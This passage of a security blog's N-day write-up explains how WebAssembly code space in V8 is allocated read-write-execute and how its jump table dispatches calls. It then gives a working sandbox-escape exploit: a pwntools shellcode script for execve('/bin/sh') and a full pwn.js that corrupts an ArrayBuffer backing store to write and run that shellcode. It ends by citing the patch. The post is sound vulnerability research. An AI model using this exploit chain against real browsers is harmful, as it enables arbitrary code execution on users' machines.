WebAssembly code is allocated.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* src/wasm/wasm-code-manager.cc:1545-1641 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">NativeModule::AddCodeSpaceLocked</span><span class="params">(base::AddressRegion region)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">  <span class="keyword">if</span> (needs_jump_table) &#123;</span><br><span class="line">    jump_table = <span class="built_in">CreateEmptyJumpTableInRegionLocked</span>(</span><br><span class="line">        JumpTableAssembler::<span class="built_in">SizeForNumberOfSlots</span>(num_wasm_functions), region);</span><br><span class="line">    <span class="built_in">CHECK</span>(region.<span class="built_in">contains</span>(jump_table-&gt;<span class="built_in">instruction_start</span>()));</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>jump_table</code> is created at the very front of the code space. The jump table determines the execution flow of functions in the WebAssembly module.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* src/wasm/wasm-code-manager.cc:1877-1934 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">WasmCodeManager::Commit</span><span class="params">(base::AddressRegion region)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">  PageAllocator::Permission permission = PageAllocator::kReadWriteExecute;</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> success;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">MemoryProtectionKeysEnabled</span>()) &#123;</span><br><span class="line">    <span class="built_in">TRACE_HEAP</span>(</span><br><span class="line">        <span class="string">&quot;Setting rwx permissions and memory protection key %d for 0x%&quot;</span> PRIxPTR</span><br><span class="line">        <span class="string">&quot;:0x%&quot;</span> PRIxPTR <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">        memory_protection_key_, region.<span class="built_in">begin</span>(), region.<span class="built_in">end</span>());</span><br><span class="line">    success = <span class="built_in">SetPermissionsAndMemoryProtectionKey</span>(</span><br><span class="line">        <span class="built_in">GetPlatformPageAllocator</span>(), region, permission, memory_protection_key_);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">TRACE_HEAP</span>(<span class="string">&quot;Setting rwx permissions for 0x%&quot;</span> PRIxPTR <span class="string">&quot;:0x%&quot;</span> PRIxPTR <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">               region.<span class="built_in">begin</span>(), region.<span class="built_in">end</span>());</span><br><span class="line">    success = <span class="built_in">SetPermissions</span>(<span class="built_in">GetPlatformPageAllocator</span>(), region.<span class="built_in">begin</span>(),</span><br><span class="line">                             region.<span class="built_in">size</span>(), permission);</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The code space permission is set to RWX because compiled WebAssembly code has to be written to and executed in this space.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(; test.wat ;)</span><br><span class="line"></span><br><span class="line">(module</span><br><span class="line">  (func $f1 (export &quot;f1&quot;))</span><br><span class="line">  (func $f2 (export &quot;f2&quot;))</span><br><span class="line">  (func $f3 (export &quot;f3&quot;))</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><code>test.wat</code> defines a WebAssembly module containing three functions, all of which are exported to JavaScript.</p><p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/4.png"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_src = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">16</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">102</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">102</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">102</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_module = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_src);</span><br></pre></td></tr></table></figure><p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/5.png"></p><p>The jump table consists of <code>jmp</code> instructions, each of which corresponds to a function in the module.</p><p>We can access the exported functions with <a href="https://developer.mozilla.org/docs/WebAssembly/Reference/JavaScript_interface/Instance/exports"><code>WebAssembly.Instance.prototype.exports</code></a>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_module);</span><br><span class="line">% <span class="title class_">DebugPrint</span>(wasm_instance.<span class="property">exports</span>);</span><br></pre></td></tr></table></figure><p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/6.png"></p><p>Each function is managed by <code>JSFunction</code> class, like any other function in JavaScript.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* src/objects/js-function.tq:20-31 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// This class does not use the generated verifier, so if you change anything</span></span><br><span class="line"><span class="comment">// here, please also update JSFunctionVerify in objects-debug.cc.</span></span><br><span class="line">@highestInstanceTypeWithinParentClassRange</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">class</span> <span class="title class_">JSFunction</span> extends JSFunctionOrBoundFunction &#123;</span><br><span class="line">  shared_function_info: SharedFunctionInfo;</span><br><span class="line">  context: Context;</span><br><span class="line">  feedback_cell: FeedbackCell;</span><br><span class="line">  @<span class="keyword">if</span>(V8_EXTERNAL_CODE_SPACE) code: CodeDataContainer;</span><br><span class="line">  @ifnot(V8_EXTERNAL_CODE_SPACE) code: Code;</span><br><span class="line">  <span class="comment">// Space for the following field may or may not be allocated.</span></span><br><span class="line">  prototype_or_initial_map: JSReceiver|Map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>JSFunction</code> has an accessor named <code>code</code> pointing to <code>CodeDataContainer</code>.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* src/objects/code.h:41-214 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// CodeDataContainer is a container for all mutable fields associated with its</span></span><br><span class="line"><span class="comment">// referencing &#123;Code&#125; object. Since &#123;Code&#125; objects reside on write-protected</span></span><br><span class="line"><span class="comment">// pages within the heap, its header fields need to be immutable. There always</span></span><br><span class="line"><span class="comment">// is a 1-to-1 relation between &#123;Code&#125; and &#123;CodeDataContainer&#125;, the referencing</span></span><br><span class="line"><span class="comment">// field &#123;Code::code_data_container&#125; itself is immutable.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CodeDataContainer</span> : <span class="keyword">public</span> HeapObject &#123;</span><br><span class="line">...</span><br><span class="line">  <span class="comment">// Cached value of code().InstructionStart().</span></span><br><span class="line">  <span class="comment">// Available only when V8_EXTERNAL_CODE_SPACE is defined.</span></span><br><span class="line">  <span class="built_in">DECL_GETTER</span>(code_entry_point, Address)</span><br><span class="line">...</span><br><span class="line">  <span class="comment">// Alias for code_entry_point to make it API compatible with Code.</span></span><br><span class="line">  <span class="function"><span class="keyword">inline</span> Address <span class="title">InstructionStart</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Alias for code_entry_point to make it API compatible with Code.</span></span><br><span class="line">  <span class="function"><span class="keyword">inline</span> Address <span class="title">raw_instruction_start</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Alias for code_entry_point to make it API compatible with Code.</span></span><br><span class="line">  <span class="function"><span class="keyword">inline</span> Address <span class="title">entry</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>CodeDataContainer</code> has an accessor named <code>code_entry_point</code>, which points to where the instruction pointer moves when the function is called.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">% <span class="title class_">DebugPrint</span>(wasm_instance.<span class="property">exports</span>.<span class="property">f3</span>);</span><br></pre></td></tr></table></figure><p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/7.png"></p><p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/8.png"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wasm_instance.<span class="property">exports</span>.<span class="title function_">f3</span>();</span><br></pre></td></tr></table></figure><p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/9.png"></p><p>At this point, <code>rdi</code> holds the address of the <code>Function</code> object. The instructions from here are responsible for getting the call target corresponding to the function called.</p><p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/10.png"></p><p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/11.png"></p><p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/12.png"></p><p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/13.png"></p><p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/14.png"></p><p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/15.png"></p><p>Eventually, the instruction pointer moves to the third entry of the jump table. It corresponds to <code>f3()</code>, which is the third function in the module.</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Get-address-of-WebAssembly-code-space"><a href="#Get-address-of-WebAssembly-code-space" class="headerlink" title="Get address of WebAssembly code space"></a>Get address of WebAssembly code space</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* src/wasm/wasm-objects.h:316-533 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Representation of a WebAssembly.Instance JavaScript-level object.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">V8_EXPORT_PRIVATE</span> WasmInstanceObject : <span class="keyword">public</span> JSObject &#123;</span><br><span class="line">...</span><br><span class="line">  <span class="built_in">DECL_PRIMITIVE_ACCESSORS</span>(jump_table_start, Address)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// Layout description.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WASM_INSTANCE_OBJECT_FIELDS(V)                                    \</span></span><br><span class="line"><span class="meta">...</span></span><br><span class="line">  <span class="built_in">V</span>(kJumpTableStartOffset, kSystemPointerSize)                            \</span><br><span class="line">...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>WasmInstanceObject</code> has an accessor named <code>jump_table_start</code> pointing to the jump table of the corresponding WebAssembly module. The jump table is located at the very front of the WebAssembly code space, so the address of the jump table is identical to that of the code space.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">% <span class="title class_">DebugPrint</span>(wasm_instance);</span><br></pre></td></tr></table></figure><p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/16.png"></p><p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/17.png"></p><p>We can obtain the address of the <code>WasmInstanceObject</code> using <code>addrof()</code> primitive, and read the value stored in <code>jump_table_start</code> field to get the address of the code space.</p><h3 id="Write-shellcode-to-WebAssembly-code-space"><a href="#Write-shellcode-to-WebAssembly-code-space" class="headerlink" title="Write shellcode to WebAssembly code space"></a>Write shellcode to WebAssembly code space</h3><p>We can obtain the address of an <code>ArrayBuffer</code> using <code>addrof()</code> primitive and overwrite <code>backing_store</code> field with an arbitrary 8-byte address that points to where we want to read from or write to. The address doesn’t have to be inside the V8 sandbox, so that we can perform unsandboxed AAR&#x2F;AAW via this corrupted <code>ArrayBuffer</code>.</p><p>Using the unsandboxed AAW, we can write our shellcode to the WebAssembly code space. The code space has both write and execute permissions, allowing us to execute our shellcode later.</p><h3 id="Execute-shellcode"><a href="#Execute-shellcode" class="headerlink" title="Execute shellcode"></a>Execute shellcode</h3><p>Calling the exported function moves the instruction pointer to the WebAssembly jump table, where our shellcode lies.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(; pwn.wat ;)</span><br><span class="line"></span><br><span class="line">(module</span><br><span class="line">  (func (export &quot;main&quot;))</span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shellcode.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context, constants, asm</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rdi == &quot;/bin/sh&quot;</span></span><br><span class="line">binsh = unpack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">shellcode += <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rdi, <span class="subst">&#123;binsh&#125;</span></span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rsi == 0</span></span><br><span class="line">shellcode += <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rdx == 0</span></span><br><span class="line">shellcode += <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rax == SYS_execve</span></span><br><span class="line">shellcode += <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">mov al, <span class="subst">&#123;constants.SYS_execve&#125;</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># syscall =&gt; execve(&quot;/bin/sh&quot;, 0, 0)</span></span><br><span class="line">shellcode += <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(asm(shellcode)))</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* pwn.js */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* constants */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> kBigIntSize = <span class="number">8</span>; <span class="comment">// size of bigint</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> wasm_src = [<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">11</span>]; <span class="comment">// wat2wasm pwn.wat</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> kJumpTableStartOffset = <span class="number">0x60</span>; <span class="comment">// offset of jump_table_start in WasmInstanceObject</span></span><br><span class="line"><span class="keyword">const</span> kBackingStoreOffset = <span class="number">0x1c</span>; <span class="comment">// offset of backing_store in JSArrayBuffer</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// execve(&quot;/bin/sh&quot;, 0, 0)</span></span><br><span class="line"><span class="keyword">const</span> shellcode = [<span class="number">72</span>, <span class="number">191</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">192</span>, <span class="number">176</span>, <span class="number">59</span>, <span class="number">15</span>, <span class="number">5</span>]; <span class="comment">// shellcode.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --------- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* helpers */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// convert integer to hex form</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>) &#123; <span class="keyword">return</span> <span class="string">`0x<span class="subst">$&#123;i.toString(<span class="number">16</span>)&#125;</span>`</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ------- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* implement exploit primitives */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// get compressed address of obj</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj</span>) &#123; <span class="keyword">return</span> <span class="title class_">Sandbox</span>.<span class="title function_">getAddressOf</span>(obj); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if value isn&#x27;t provided, read bigint from addr</span></span><br><span class="line"><span class="comment">// otherwise, write bigint value to addr</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">rw</span>(<span class="params">addr, value = <span class="literal">NaN</span></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> view = <span class="keyword">new</span> <span class="title class_">DataView</span>(<span class="keyword">new</span> <span class="title class_">Sandbox</span>.<span class="title class_">MemoryView</span>(addr, kBigIntSize));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Number</span>.<span class="built_in">isNaN</span>(value)) &#123; <span class="comment">// read</span></span><br><span class="line">    <span class="keyword">return</span> view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123; <span class="comment">// write</span></span><br><span class="line">    view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---------------------------- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* escape v8 sandbox */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// construct wasm module</span></span><br><span class="line"><span class="keyword">let</span> wasm_module = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(wasm_src));</span><br><span class="line"></span><br><span class="line"><span class="comment">// get address of wasm code space</span></span><br><span class="line"><span class="keyword">let</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_module);</span><br><span class="line"><span class="keyword">let</span> wasm_instance_addr = <span class="title function_">addrof</span>(wasm_instance);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] wasm_instance_addr == <span class="subst">$&#123;hex(wasm_instance_addr)&#125;</span>`</span>);</span><br><span class="line"><span class="keyword">let</span> wasm_code_space_addr = <span class="title function_">rw</span>(wasm_instance_addr + kJumpTableStartOffset);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] wasm_code_space_addr == <span class="subst">$&#123;hex(wasm_code_space_addr)&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// overwrite backing store of buf with address of wasm code space</span></span><br><span class="line"><span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(shellcode.<span class="property">length</span>);</span><br><span class="line"><span class="keyword">let</span> buf_addr = <span class="title function_">addrof</span>(buf);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] buf_addr == <span class="subst">$&#123;hex(buf_addr)&#125;</span>`</span>);</span><br><span class="line"><span class="title function_">rw</span>(buf_addr + kBackingStoreOffset, wasm_code_space_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// write shellcode to wasm code space</span></span><br><span class="line"><span class="keyword">let</span> view = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123; view.<span class="title function_">setUint8</span>(i, shellcode[i]); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// execute shellcode</span></span><br><span class="line">wasm_instance.<span class="property">exports</span>.<span class="title function_">main</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ----------------- */</span></span><br></pre></td></tr></table></figure><p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/pwn.png"></p><h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><blockquote><p><a href="https://github.com/v8/v8/commit/f759872d52093d1ac2b531f7e8fa956264b57ad9">[wasm] Ship code protection via mprotect</a> (Feb 15, 2022)</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> N-day </category>
          
      </categories>
      
      
        <tags>
            
            <tag> chromium </tag>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
